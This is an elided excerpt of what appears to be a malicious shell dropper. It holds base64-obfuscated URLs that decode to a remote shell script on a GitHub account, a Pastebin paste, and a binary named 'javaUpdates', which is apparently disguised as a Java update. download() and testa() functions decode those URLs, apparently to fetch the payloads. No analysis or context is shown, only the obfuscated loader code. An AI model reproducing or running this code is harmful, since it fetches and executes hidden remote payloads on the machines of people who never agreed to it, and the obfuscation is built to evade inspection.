...
house=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3poYW5naHVjaGFuamlhbi8xL21hc3Rlci9xcXEuc2g=|base64 -d)
room=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3RTcjdMRENQCg==|base64 -d)
park=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3poYW5naHVjaGFuamlhbi8xL21hc3Rlci9xcXEuc2g=|base64 -d)
beam=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3poYW5naHVjaGFuamlhbi8xL21hc3Rlci9xcXEuc2g=|base64 -d)
...
function download() {
	...
	if [ ${pa} -eq 0 ];then
		mi_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3poYW5naHVjaGFuamlhbi8xL3Jhdy9tYXN0ZXIvamF2YVVwZGF0ZXM=|base64 -d)
...
function testa() {
	...
	if [ ${pb} -eq 0 ];then
		st_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3poYW5naHVjaGFuamlhbi8xL3Jhdy9tYXN0ZXIvamF2YVVwZGF0ZXM=|base64 -d)
